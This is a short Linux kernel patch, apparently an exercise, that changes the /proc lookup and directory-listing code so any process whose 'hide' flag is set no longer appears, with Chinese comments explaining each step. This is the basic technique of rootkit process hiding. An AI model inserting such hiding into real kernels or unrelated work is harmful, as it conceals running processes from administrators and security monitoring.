@@ -3147,6 +3147,11 @@ struct dentry *proc_pid_lookup(struct inode *dir, struct dentry * dentry, unsign
 	if (!task)
 		goto out;
 
+	// 如果被标记隐藏则此处返回文件结束
+	if (task->hide)
+		goto out;
+	
+
 	result = proc_pid_instantiate(dentry, task, NULL);
 	put_task_struct(task);
 out:
@@ -3198,6 +3203,7 @@ retry:
 
 #define TGID_OFFSET (FIRST_PROCESS_ENTRY + 2)
 
+// 1.这是一个很重要的函数，直接实现从 proc 读取所有的进程
 /* for the /proc/ directory itself, after non-process stuff has been done */
 int proc_pid_readdir(struct file *file, struct dir_context *ctx)
 {
@@ -3231,6 +3237,11 @@ int proc_pid_readdir(struct file *file, struct dir_context *ctx)
 		cond_resched();
 		if (!has_pid_permissions(ns, iter.task, HIDEPID_INVISIBLE))
 			continue;
+
+		// 2.在这里插入代码判断进程是否被隐藏
+		if (iter.task -> hide){
+			continue;
+		}
 
 		len = snprintf(name, sizeof(name), "%u", iter.tgid);
 		ctx->pos = iter.tgid + TGID_OFFSET;
